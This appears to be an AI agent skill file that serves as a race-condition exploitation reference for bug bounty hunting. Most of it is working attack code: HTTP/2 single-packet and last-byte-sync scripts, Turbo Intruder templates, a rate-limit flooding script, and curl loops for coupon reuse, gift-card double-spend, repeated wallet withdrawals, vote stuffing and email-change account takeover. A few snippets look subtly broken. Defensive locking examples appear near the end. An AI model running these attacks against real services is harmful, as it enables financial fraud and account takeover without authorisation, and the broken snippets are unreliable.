---
name: race-condition-testing
description: Race condition mastery - single-packet attack, last-byte sync, TOCTOU exploitation, double-spend, and concurrent workflow abuse
---

# Race Condition Testing Master Reference

## 1. Fundamentals

Race conditions occur when websites process requests concurrently without adequate safeguards. Multiple distinct threads interact with the same data at the same time, causing a "collision" that produces unintended behavior.

### 1.1 The Core Pattern

Every race condition follows TOCTOU (Time-of-Check to Time-of-Use):

```
Thread 1: CHECK balance ($100) → DECIDE (allow transfer) → USE (deduct $100)
Thread 2: CHECK balance ($100) → DECIDE (allow transfer) → USE (deduct $100)
                               ↑ Time window between check and use
```

If Thread 2's CHECK runs before Thread 1's USE, both see $100 and both succeed.

### 1.2 Why Race Conditions Pay

- **Not findable by scanners** — require precise timing and understanding of state
- **Direct financial impact** — double-spend, coupon reuse, balance manipulation
- **Common** — every state-changing endpoint is a candidate
- **PortSwigger 2023 research** ("Smashing the State Machine") made them reliable
- **$5k-$15k+ bounties** common for fintech and e-commerce targets

### 1.3 HTTP Version Matters

| HTTP Version | Attack Technique | Reliability | Max Requests |
|-------------|-----------------|-------------|-------------|
| HTTP/1.1 | Last-byte synchronization | Low (jitter) | 2-3 per race |
| HTTP/2 | Single-packet attack | High (nanosecond) | 20-30 per race |
| HTTP/3 | Multi-stream race | Theoretical | TBD |

## 2. Single-Packet Attack (HTTP/2)

The single-packet attack was developed by James Kettle (PortSwigger, Black Hat 2023). It bundles 20-30 HTTP/2 requests into a single TCP packet, eliminating network jitter entirely.

### 2.1 Turbo Intruder Script

```python
# Single-packet attack via Turbo Intruder (Engine.BURP2 required)
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    # Queue 30 identical requests behind a gate
    for i in range(30):
        engine.queue(target.req, gate='race1')

    # Open gate — all requests sent in a single TCP packet
    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

### 2.2 Python Implementation

```python
#!/usr/bin/env python3
"""
HTTP/2 single-packet race attack using h2 library
"""
import h2.connection
import h2.events
import socket
import ssl
import threading
import time

def single_packet_race(host, path, headers, body_template, count=30):
    """Send N requests in a single HTTP/2 TCP packet"""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    sock = socket.create_connection((host, 443))
    sock = ctx.wrap_socket(sock, server_hostname=host)

    conn = h2.connection.H2Connection()
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())

    stream_ids = []
    for i in range(count):
        stream_id = conn.get_next_available_stream_id()
        stream_ids.append(stream_id)

        headers_list = [
            (':method', 'POST'),
            (':path', path),
            (':authority', host),
            (':scheme', 'https'),
        ]
        for k, v in headers.items():
            headers_list.append((k.lower(), v))

        conn.send_headers(stream_id, headers_list)
        conn.send_data(stream_id, body_template.encode(), end_stream=True)

    # Send ALL frames in a single write
    data = conn.data_to_send()
    sock.sendall(data)

    # Collect responses
    responses = []
    while len(responses) < count:
        data = sock.recv(65535)
        if not data:
            break
        events = conn.receive_data(data)
        for event in events:
            if isinstance(event, h2.events.ResponseReceived):
                responses.append(event)
        sock.sendall(conn.data_to_send())

    sock.close()
    return responses
```

### 2.3 Curl-Based Single-Packet (HTTP/2)

```bash
# Using curl with HTTP/2 multiplexing
# Send all requests in rapid succession over a single connection
for i in $(seq 1 20); do
  echo "request $i"
  curl -s --http2 -X POST "https://target.com/api/coupon/redeem" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"code":"SINGLE-USE-CODE"}' \
    --next &
done
wait

# Alternative: use parallel with --http2-prior-knowledge
seq 1 30 | parallel -j0 curl -s --http2-prior-knowledge \
  -X POST "https://target.com/api/coupon/redeem" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"code":"SINGLE-USE-CODE"}'
```

## 3. Last-Byte Synchronization (HTTP/1.1)

For HTTP/1.1 targets, the classic technique is last-byte sync. Send all but the last byte of each request, then send all last bytes simultaneously.

### 3.1 Turbo Intruder Implementation

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           engine=Engine.THREADED)

    for i in range(20):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')
    engine.complete(timeout=60)
```

### 3.2 Python Raw Socket Implementation

```python
#!/usr/bin/env python3
"""
HTTP/1.1 last-byte synchronization race attack
"""
import socket
import ssl
import threading
import time

def last_byte_sync_race(host, port, raw_request_template, count=20):
    """
    Send N requests where all but the last byte are sent first,
    then the final bytes are sent simultaneously.
    """
    # Remove trailing \r\n\r\n from template
    template = raw_request_template.rstrip()
    # Split so last byte is separate
    base = template[:-1]
    last_byte = template[-1:]

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    socks = []
    for i in range(count):
        sock = socket.create_connection((host, port))
        ssock = ctx.wrap_socket(sock, server_hostname=host)
        # Send all but last byte
        ssock.send(base.encode())
        socks.append(ssock)

    # Brief pause to ensure all "almost complete" requests are buffered
    time.sleep(0.05)

    # Send all final bytes simultaneously
    for ssock in socks:
        ssock.send(last_byte.encode())

    # Collect responses
    responses = []
    for ssock in socks:
        try:
            data = ssock.recv(4096)
            responses.append(data)
        except:
            pass
        ssock.close()

    return responses
```

## 4. Common Race Condition Targets

### 4.1 Coupon / Promo Code Reuse

```bash
# 1. Get single-use coupon code
curl -s "https://target.com/api/coupon/generate" -H "Authorization: Bearer $TOKEN"
# {"code": "ONETIME-A1B2C3"}

# 2. Redeem it 20 times simultaneously
for i in $(seq 1 20); do
  curl -s -X POST "https://target.com/api/coupon/redeem" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"code":"ONETIME-A1B2C3"}' &
done
wait

# 3. Check balance
curl -s "https://target.com/api/wallet/balance" -H "Authorization: Bearer $TOKEN"
# If balance increased by 20x coupon value -> race condition confirmed
```

### 4.2 Gift Card Double-Spend

```bash
# Redeem same gift card 20 times
for i in $(seq 1 20); do
  curl -s -X POST "https://target.com/api/gift-card/redeem" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"code":"GIFT-ABCD-1234"}' &
done
wait

# Check wallet
curl -s "https://target.com/api/wallet/balance" -H "Authorization: Bearer $TOKEN"
```

### 4.3 Balance Transfer / Withdrawal

```bash
# Withdraw entire balance 20 times simultaneously
for i in $(seq 1 20); do
  curl -s -X POST "https://target.com/api/wallet/withdraw" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"amount": 100, "method": "paypal"}' &
done
wait

# Check transactions
curl -s "https://target.com/api/wallet/transactions" -H "Authorization: Bearer $TOKEN"
# Multiple $100 withdrawals from a single $100 balance
```

### 4.4 Loyalty Points / Credits

```bash
# Redeem points for cash multiple times
for i in $(seq 1 20); do
  curl -s -X POST "https://target.com/api/loyalty/redeem" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"points": 10000, "value": 10}' &
done
wait

# Convert between points and credits
for i in $(seq 1 20); do
  curl -s -X POST "https://target.com/api/loyalty/convert" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"from": "points", "to": "credits", "amount": 100}' &
done
wait
```

### 4.5 Inventory / Stock

```bash
# Buy last item in stock 20 times (race on inventory)
for i in $(seq 1 20); do
  curl -s -X POST "https://target.com/api/orders/create" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"product_id": 1, "quantity": 1}' &
done
wait

# Check stock
curl -s "https://target.com/api/products/1" | jq '.stock'
# Should be 0 but 20 people bought it? -> race condition on stock deduction
```

### 4.6 Voting / Rating System

```bash
# Vote multiple times
for i in $(seq 1 100); do
  curl -s -X POST "https://target.com/api/posts/1/vote" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"vote": 1}' &
done
wait

# Check vote count
curl -s "https://target.com/api/posts/1" | jq '.votes'
```

### 4.7 Account Creation / Registration

```bash
# Register same email multiple times
for i in $(seq 1 10); do
  curl -s -X POST "https://target.com/api/register" \
    -H "Content-Type: application/json" \
    -d '{"email":"user@test.com","password":"Test123!"}' &
done
wait

# Multiple accounts created with same email?
```

## 5. Multi-Endpoint Race Conditions

Race conditions across different endpoints in the same workflow:

### 5.1 Add Items While Checking Out

```bash
# Send checkout + add-to-cart simultaneously
# Terminal 1: Add more items
curl -s -X POST "https://target.com/api/cart/add" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": 2, "quantity": 1, "price": 500}' &

# Terminal 2: Complete checkout (same time)
curl -s -X POST "https://target.com/api/checkout" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"payment_method": "card"}' &

wait

# Does the order include items that shouldn't have been in the cart?
# Payment validated for $100, but order shipped with $500 item
```

### 5.2 Apply Discount + Checkout

```bash
for i in $(seq 1 5); do
  curl -s -X POST "https://target.com/api/coupon/apply" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"code": "SUMMER20"}' &
done

curl -s -X POST "https://target.com/api/checkout" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{}' &

wait
```

### 5.3 Modify Order After Payment

```bash
# Step 1: Pay for order
curl -s -X POST "https://target.com/api/payments/confirm" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"order_id": 123, "amount": 100}' &

# Step 2: Modify order while payment is processing
curl -s -X PATCH "https://target.com/api/orders/123" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"items": [{"id": 3, "price": 9999, "qty": 1}]}' &

wait

# Check what was actually shipped
curl -s "https://target.com/api/orders/123" | jq '.items'
```

## 6. Single-Endpoint Race Conditions

### 6.1 Email Change Confusion

```bash
# Send two email changes simultaneously
# Both might succeed if the confirmation token is generated before the email is updated
curl -s -X PATCH "https://target.com/api/users/me/email" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker@evil.com"}' &

curl -s -X PATCH "https://target.com/api/users/me/email" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker2@evil.com"}' &

wait

# Check which email is active
curl -s "https://target.com/api/users/me" | jq '.email'
# If both sent confirmation links -> both are active -> two paths to ATO
```

### 6.2 Password Reset Token Race

```bash
# Request password reset for two different accounts simultaneously
# If tokens are timestamp-based, they might collide
curl -s -X POST "https://target.com/api/password-reset" \
  -H "Content-Type: application/json" \
  -d '{"email": "victim@target.com"}' &

curl -s -X POST "https://target.com/api/password-reset" \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker@evil.com"}' &

wait

# Check if both got the same token (if token = md5(timestamp))
# If tokens are same, attacker can use victim's token
```

### 6.3 Rate Limit Reset

```bash
# Send password reset requests rapidly
# If rate limit for resets is checked-per-request, racing might bypass it
for i in $(seq 1 50); do
  curl -s -X POST "https://target.com/api/password-reset" \
    -H "Content-Type: application/json" \
    -d '{"email": "victim@target.com"}' &
done
wait
```

## 7. Deferred Race Conditions

Not all race conditions require sub-second timing. Some have windows of minutes or hours:

```bash
# Email change with 20-minute deferred collision

# Step 1 (T=0): Request email change
curl -s -X PATCH "https://target.com/api/users/me/email" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker@evil.com"}'

# Step 2 (T=20min): Request another email change WITHOUT confirming the first
sleep 1200
curl -s -X PATCH "https://target.com/api/users/me/email" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker2@evil.com"}'

# Step 3: Check if first confirmation link still works
# If the first link still works -> deferred race on email state
```

## 8. Detection Methodology

### 8.1 PortSwigger's 3-Question Method

For each endpoint, ask three questions to identify race candidates:

1. **Is there a limit to exceed?** (coupon uses, balance, votes, inventory)
2. **Does the endpoint modify state?** (deduct, add, transfer, change status)
3. **Is there a check-before-use pattern?** (verify balance, check stock, validate coupon)

If YES to all three -> high-priority race candidate.

### 8.2 Chaos-Based Probing

When you can't predict exact race windows, use chaos:

```python
def chaos_probe(url, headers, body, count=50):
    """Send many identical requests and look for anomalies"""
    import requests
    import concurrent.futures

    def send():
        try:
            r = requests.post(url, headers=headers, json=body, timeout=10)
            return (r.status_code, len(r.content), r.text[:200])
        except:
            return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
        futures = [ex.submit(send) for _ in range(count)]
        results = [f.result() for f in concurrent.futures.as_completed(futures)]

    # Analyze response patterns
    success = [r for r in results if r and r[0] in [200, 201]]
    print(f"Total requests: {count}")
    print(f"Successful: {len(success)}")
    print(f"Expected success (if single-use): 1")
    print(f"Race condition if successful > 1: {len(success) > 1}")
```

### 8.3 Response Analysis

After a race test, check for:

- More successful responses than should be possible
- Different response bodies in parallel vs sequential tests
- State changes that contradict the business logic
- Database inconsistencies (negative balances, inventory below zero)
- Multiple transactions from a single-action endpoint

```bash
# Before/after comparison
curl -s "https://target.com/api/wallet/balance" -H "Authorization: Bearer $TOKEN"
# Run race attack
# Check again
curl -s "https://target.com/api/wallet/balance" -H "Authorization: Bearer $TOKEN"

# Check transaction log
curl -s "https://target.com/api/transactions" -H "Authorization: Bearer $TOKEN" | jq '.transactions | length'
```

## 9. Rate-Limit Abuse for Race Windows

A counter-intuitive technique: trigger rate limiting DELAYS processing, which extends the race window:

```python
def extend_race_window(url, race_endpoint, race_body, token, dummy_count=100):
    """
    Trigger rate limiting with dummy requests to force server-side delay,
    then race the real endpoint during the delay.
    """
    import requests
    import concurrent.futures

    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}

    # Phase 1: Flood with dummy requests to trigger rate limiting
    def send_dummy():
        requests.get(url + "/api/search?q=test", headers=headers)

    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
        dummies = [ex.submit(send_dummy) for _ in range(dummy_count)]
        concurrent.futures.wait(dummies)

    # Phase 2: Race the real endpoint while server is under load
    def send_race():
        return requests.post(url + race_endpoint, headers=headers, json=race_body)

    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
        races = [ex.submit(send_race) for _ in range(30)]
        concurrent.futures.wait(races)

    # Results
    successes = sum(1 for r in races if r.result().status_code in [200, 201])
    print(f"Race results: {successes}/30 succeeded")
    return successes
```

## 10. Tool Configurations

### 10.1 Burp Turbo Intruder - Complete Templates

```python
# Template 1: Classic limit overrun (single-packet)
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    for i in range(30):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    if 'success' in req.response.lower() or '200 OK' in str(req.response):
        table.add(req)

# Template 2: Multi-endpoint race
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    # Different endpoints, same race
    endpoints = [
        "/api/coupon/redeem",
        "/api/cart/add",
        "/api/checkout"
    ]

    for ep in endpoints:
        engine.queue(target.req, ep, gate='race1')

    engine.openGate('race1')
    engine.complete(timeout=60)

# Template 3: Warmup + race
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    # Warmup request to establish connection
    engine.queue(target.req, '/')

    # Race requests
    for i in range(30):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')
    engine.complete(timeout=60)

# Template 4: Staggered race (different payloads)
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    # Each request has a different coupon code
    for code in ['CODE1', 'CODE2', 'CODE3', 'CODE4', 'CODE5']:
        engine.queue(target.req, code, gate='race1')

    engine.openGate('race1')
    engine.complete(timeout=60)
```

### 10.2 Python Concurrent Futures

```python
#!/usr/bin/env python3
import concurrent.futures
import requests
import argparse
import json
import sys
import time

class RaceTester:
    def __init__(self, base_url, token, concurrent=30):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json"
        })
        self.concurrent = concurrent

    def race_endpoint(self, path, method="POST", body=None, count=None):
        """Race a single endpoint with concurrent requests"""
        if count is None:
            count = self.concurrent

        url = f"{self.base_url}{path}"
        successes = 0
        failures = 0
        responses = []

        def send_request():
            try:
                if method == "POST":
                    r = self.session.post(url, json=body, timeout=30)
                elif method == "PUT":
                    r = self.session.put(url, json=body, timeout=30)
                elif method == "DELETE":
                    r = self.session.delete(url, timeout=30)
                elif method == "PATCH":
                    r = self.session.patch(url, json=body, timeout=30)
                else:
                    r = self.session.get(url, timeout=30)
                return (r.status_code, r.text[:500], r.elapsed.total_seconds())
            except Exception as e:
                return (0, str(e), 0)

        start = time.time()
        with concurrent.futures.ThreadPoolExecutor(max_workers=count) as executor:
            futures = [executor.submit(send_request) for _ in range(count)]
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                responses.append(result)
                if result[0] in [200, 201, 202, 204]:
                    successes += 1
                else:
                    failures += 1

        elapsed = time.time() - start

        print(f"\n[+] Race test: {method} {path}")
        print(f"    Requests: {count} in {elapsed:.2f}s")
        print(f"    Success: {successes}, Failed: {failures}")
        print(f"    Rate: {count/elapsed:.0f} req/s")

        if successes > 1:
            print(f"[!] RACE CONDITION DETECTED: {successes}/{count} succeeded")
            print(f"    Expected: 1, Actual: {successes}")

        return successes, responses

    def check_state(self, path):
        """Get current state for before/after comparison"""
        r = self.session.get(f"{self.base_url}{path}")
        return r.json()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    parser.add_argument("--token", required=True)
    parser.add_argument("--endpoint", default="/api/wallet/withdraw")
    parser.add_argument("--method", default="POST")
    parser.add_argument("--body", default='{"amount":1}')
    parser.add_argument("--count", type=int, default=30)
    args = parser.parse_args()

    tester = RaceTester(args.url, args.token)
    body = json.loads(args.body)

    print("[*] Getting baseline state...")
    before = tester.check_state("/api/wallet/balance")
    print(f"    Before: {json.dumps(before, indent=2)}")

    tester.race_endpoint(args.endpoint, args.method, body, args.count)

    print("[*] Checking final state...")
    after = tester.check_state("/api/wallet/balance")
    print(f"    After: {json.dumps(after, indent=2)}")
```

## 11. Detection & Reporting

### 11.1 Signs of Race Conditions

- Multiple successful responses from single-use endpoints
- Balance changes larger than expected
- Inventory going negative
- Same coupon redeemed N times
- Multiple accounts with same email
- Transaction log shows parallel entries

### 11.2 Testing Checklist

- [ ] Every endpoint that deducts from a balance
- [ ] Every endpoint that applies a discount/coupon
- [ ] Every endpoint that transfers value (points, credits, currency)
- [ ] Every endpoint that decrements inventory
- [ ] Every endpoint that increments a counter (votes, likes, views)
- [ ] Every single-use token/OTP verification
- [ ] Email/password change flows
- [ ] Registration with same email
- [ ] Subscription plan changes
- [ ] Order modification during payment

### 11.3 Proof of Reproduction

```bash
# Essential evidence:
# 1. Sequential test (works correctly once)
curl -s -X POST "https://target.com/api/coupon/redeem" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"code":"ONETIME"}'
# Response: {"success": true, "discount": 10}

# Second sequential attempt (correctly blocked)
curl -s -X POST "https://target.com/api/coupon/redeem" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"code":"ONETIME"}'
# Response: {"error": "Coupon already used"}

# 2. Parallel test (race condition demonstrated)
for i in $(seq 1 5); do
  curl -s -X POST "https://target.com/api/coupon/redeem" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"code":"ONETIME"}' &
done
wait
# FIVE responses: all {"success": true, "discount": 10}
# -> Race condition confirmed
```

## 12. Defensive Patterns (For Understanding)

Understanding defenses helps identify weaknesses:

```javascript
// VULNERABLE: Check then write (race window)
async function redeemCoupon(code, userId) {
    const coupon = await db.coupons.findOne({code});
    if (coupon.used) return {error: 'Already used'};
    await db.wallet.updateOne({userId}, {$inc: {balance: coupon.value}});
    await db.coupons.updateOne({code}, {used: true, usedBy: userId});
    return {success: true};
}

// SECURE: Atomic transaction (no race window)
async function redeemCoupon(code, userId) {
    const session = await db.startSession();
    session.startTransaction();
    try {
        const coupon = await db.coupons.findOneAndUpdate(
            {code, used: false},  // Only find if NOT used
            {used: true, usedBy: userId, usedAt: new Date()},
            {session}
        );
        if (!coupon) throw new Error('Already used');
        await db.wallet.updateOne(
            {userId},
            {$inc: {balance: coupon.value}},
            {session}
        );
        await session.commitTransaction();
        return {success: true};
    } catch (e) {
        await session.abortTransaction();
        return {error: e.message};
    }
}
```

## 13. CVE / Research References

- **CVE-2022-4037** - GitLab race condition in Devise authentication: email verification token race leads to verified email forgery and OAuth account takeover
- **CVE-2016-5195** - Dirty COW: Linux kernel race condition in copy-on-write, local privilege escalation
- **CVE-2024-58248** - nopCommerce gift card race condition: missing locking allows duplicate redemption
- **PortSwigger 2023** - "Smashing the State Machine: The True Potential of Web Race Conditions" by James Kettle (Black Hat USA 2023)
- **PortSwigger 2024** - "Single-packet attack: making remote race conditions 'local'" by James Kettle
- **RyotaK 2024** - "Beyond the Limit: Expanding single-packet race condition with first sequence sync for breaking the 65,535 byte limit"
- **HackerOne Top Reports** - Multiple $5k-$15k race condition bounties in fintech and e-commerce

## 14. Language/Framework Specific Patterns

### 14.1 Node.js / Express

Node.js is single-threaded but async I/O means non-blocking operations CAN race:

```javascript
// VULNERABLE: async/await with non-atomic operations
router.post('/redeem', async (req, res) => {
    const coupon = await Coupon.findOne({code: req.body.code});
    if (coupon.used) return res.status(400).json({error: 'used'});
    // RACE WINDOW: multiple requests pass the check simultaneously
    await Wallet.updateOne({userId: req.user.id}, {$inc: {balance: coupon.value}});
    await Coupon.updateOne({code: req.body.code}, {used: true});
    res.json({success: true});
});

// Race test: send 20 requests to the same Node.js endpoint
// Even though Node is single-threaded, await yields control between operations
```

### 14.2 Python / Django

```python
# VULNERABLE: Django ORM select-then-update
@transaction.atomic
def redeem_coupon(request):
    coupon = Coupon.objects.get(code=request.POST['code'])
    if coupon.used:
        return JsonResponse({'error': 'used'}, status=400)
    # RACE WINDOW: transaction.atomic() doesn't lock rows by default
    wallet = Wallet.objects.get(user=request.user)
    wallet.balance += coupon.value
    wallet.save()
    coupon.used = True
    coupon.save()
    return JsonResponse({'success': True})

# FIXED: Use select_for_update() to lock the row
@transaction.atomic
def redeem_coupon(request):
    coupon = Coupon.objects.select_for_update().get(code=request.POST['code'])
    # Row is locked until transaction commits -> no race
```

### 14.3 Ruby on Rails

```ruby
# VULNERABLE: Rails without locking
def redeem
  coupon = Coupon.find_by(code: params[:code])
  if coupon.used?
    render json: { error: 'used' }, status: :bad_request
    return
  end
  # RACE WINDOW
  current_user.wallet.increment!(:balance, coupon.value)
  coupon.update!(used: true)
  render json: { success: true }
end

# FIXED: Use pessimistic locking
def redeem
  coupon = Coupon.lock.find_by(code: params[:code])
  # Row locked until transaction commits
end
```

### 14.4 Go / Gin

```go
// VULNERABLE: Go routines race on shared state
func redeemCoupon(c *gin.Context) {
    code := c.PostForm("code")
    coupon := db.GetCoupon(code)  // Not thread-safe
    if coupon.Used { return }
    // RACE WINDOW: goroutines interleave here
    db.UpdateWallet(c.GetString("user_id"), coupon.Value)
    db.MarkCouponUsed(code)
}

// FIXED: Mutex or database-level locking
var mu sync.Mutex
func redeemCoupon(c *gin.Context) {
    mu.Lock()
    defer mu.Unlock()
    // Critical section
}
```

## 15. Database Isolation Levels

Understanding database behavior helps predict race conditions:

| Isolation Level | Dirty Read | Non-Repeatable Read | Phantom Read | Race Risk |
|----------------|-----------|--------------------|--------------|----------|
| READ UNCOMMITTED | Yes | Yes | Yes | VERY HIGH |
| READ COMMITTED | No | Yes | Yes | HIGH |
| REPEATABLE READ | No | No | Yes | MEDIUM |
| SERIALIZABLE | No | No | No | LOW |

```bash
# Test: if the app uses READ COMMITTED (default in most DBs),
# two concurrent transactions can both READ the same value
# before either WRITES -> race condition guaranteed

# SERIALIZABLE isolation prevents race conditions
# but most apps don't use it due to performance cost
```

## 16. Advanced: Connection Pooling Race

When apps use connection pooling, multiple requests may share the same database connection:

```bash
# Test with keep-alive connections
curl -s -X POST "https://target.com/api/coupon/redeem" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Connection: keep-alive" \
  -H "Content-Type: application/json" \
  -d '{"code":"TEST"}' &

curl -s -X POST "https://target.com/api/coupon/redeem" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Connection: keep-alive" \
  -H "Content-Type: application/json" \
  -d '{"code":"TEST"}' &

wait

# If both use the same pooled connection and the DB driver
# doesn't enforce serialization, race window is larger
```

## 17. Race Condition vs. Business Logic Distinction

Race conditions are a SUBSET of business logic flaws, but they have distinct characteristics:

| Business Logic Flaw | Race Condition |
|--------------------|----------------|
| Single request exploits logic | Multiple concurrent requests |
| State manipulation via params | Timing-based exploitation |
| Works sequentially | Requires parallelism |
| Always reproducible | May be probabilistic |
| Easy to test | Requires tooling (Turbo Intruder) |
| Example: negative quantity | Example: double coupon use |

Both are critical for comprehensive testing. Test business logic bugs first (easier), then race conditions (harder but higher paying).
